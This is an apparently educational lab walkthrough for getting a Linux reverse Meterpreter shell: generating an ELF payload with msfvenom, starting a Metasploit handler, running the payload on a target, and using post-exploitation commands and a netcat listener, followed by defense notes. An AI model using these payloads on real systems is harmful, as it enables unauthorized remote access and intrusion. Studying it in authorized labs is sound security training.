# 🛡️ Practical 2 – Linux Reverse Shell

Today we will understand a **basic Linux reverse shell lab practical** where we will:

✔ Generate a Linux payload
✔ Make the file executable (`chmod +x`)
✔ Set up a Metasploit handler
✔ Establish a reverse Meterpreter session

⚠️ This practical is only for an **authorized lab environment (Kali + Linux VM)**.

---

# 1️⃣ Basic Concept 📌

## 📌 What is a Reverse Shell?

In a reverse shell:

👉 The target machine connects to the attacker machine.

Meaning:

* Attacker waits
* Target itself initiates the connection

---

## 🧠 Flow Diagram

```text
Attacker (Kali)  <------  Linux Target
   Listener           Reverse Connection
```

---

# 2️⃣ Lab Setup 🖥️

## 📌 Required Machines

✔ Kali Linux (Attacker)
✔ Ubuntu / Debian VM (Target)
✔ Same Network

---

# 3️⃣ Find Kali IP Address 🌐

## 📌 Check IP

```bash
ip a
```

Example Output:

```text
192.168.1.10
```

👉 This is the attacker IP
👉 This is what we call **LHOST**.

---

# 4️⃣ Create Linux Payload 🧨

## 📌 Payload Generation (msfvenom)

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp \
LHOST=192.168.1.10 \
LPORT=4444 \
-f elf > shell.elf
```

---

# 🧠 Command Breakdown

| Part                              | Meaning                           |
| --------------------------------- | --------------------------------- |
| msfvenom                          | Payload generator tool            |
| -p                                | Payload type                      |
| linux/x86/meterpreter/reverse_tcp | Linux reverse Meterpreter payload |
| LHOST                             | Kali attacker IP                  |
| LPORT                             | Listening port                    |
| -f elf                            | Linux executable format           |
| > shell.elf                       | Save output into file             |

---

# 📌 Output

✔ `shell.elf` file is generated
✔ This is the Linux executable payload

---

# 5️⃣ Start Metasploit Framework ⚙️

## 📌 Open Metasploit

```bash
msfconsole
```

---

# 6️⃣ Configure Handler 🎯

## 📌 Use Multi Handler

```bash
use exploit/multi/handler
```

---

## 📌 Set Payload

```bash
set payload linux/x86/meterpreter/reverse_tcp
```

---

## 📌 Set Network Settings

```bash
set LHOST 192.168.1.10
```

```bash
set LPORT 4444
```

---

# 7️⃣ Start Listener ▶️

```bash
exploit
```

or

```bash
run
```

---

## 📌 Status

✔ Metasploit will now wait for the reverse connection

---

# 8️⃣ Transfer Payload to Target 📂

## 📌 Methods

You can transfer the payload to the Linux target machine using:

✔ USB
✔ Shared folder
✔ SCP
✔ Python HTTP server
✔ Manual copy

Example filename:

```text
shell.elf
```

---

# 9️⃣ Make File Executable 🔓

In Linux, it is necessary to give executable permission.

---

## ⚙️ Command

```bash
chmod +x shell.elf
```

---

# 🧠 Meaning

| Part      | Meaning                   |
| --------- | ------------------------- |
| chmod     | Change file permissions   |
| +x        | Add executable permission |
| shell.elf | Payload file              |

---

# 🔟 Execute Payload ▶️

## 📌 Run File

```bash
./shell.elf
```

---

# 🧠 Meaning

| Part      | Meaning                         |
| --------- | ------------------------------- |
| ./        | Run file from current directory |
| shell.elf | Payload executable              |

---

# 1️⃣1️⃣ Successful Connection 🔗

If everything is correct, Metasploit will show output:

```text
Meterpreter session opened
```

---

# 1️⃣2️⃣ Basic Meterpreter Commands 🧠

## 📌 System Information

```bash
sysinfo
```

---

## 📌 Current User

```bash
getuid
```

---

## 📌 Current Directory

```bash
pwd
```

---

## 📌 File Listing

```bash
ls
```

---

## 📌 Open Linux Shell

```bash
shell
```

---

# 1️⃣3️⃣ Netcat Listener (Alternative) 📡

If you want to test a simple TCP listener:

```bash
nc -lvp 4444
```

---

# 🧠 Breakdown

| Part    | Meaning     |
| ------- | ----------- |
| nc      | Netcat tool |
| -l      | Listen mode |
| -v      | Verbose     |
| -p 4444 | Port 4444   |

---

# 📌 Overall Attack Flow Summary 🔥

```text
1. Find attacker IP
2. Generate Linux payload
3. Start Metasploit handler
4. Transfer payload to target
5. chmod +x shell.elf
6. Execute payload
7. Reverse connection established
8. Meterpreter session opened
```

---

# 🛡️ Security Perspective

## 📌 Why Modern Systems Detect This

✔ EDR tools
✔ Suspicious outbound connections
✔ Unknown ELF execution
✔ Network monitoring
✔ Behavioral detection

---

## 📌 Defense Methods

✔ Don't execute unknown ELF files
✔ Restrict executable permissions
✔ Monitor reverse connections
✔ Use endpoint security tools
✔ Apply least privilege access

---

# 🎯 Interview Questions

✔ What is reverse TCP payload?
✔ Why is `chmod +x` required in Linux?
✔ Difference between ELF and EXE?
✔ Why must the handler and payload match?
✔ Meterpreter advantages?

---

# 🏁 Final Thought

This practical is a foundational concept of Linux exploitation:

👉 Payload generation
👉 Executable permissions
👉 Reverse TCP communication
👉 Meterpreter session handling

If this is clear →
Advanced Linux penetration testing and post-exploitation concepts become easier 🔥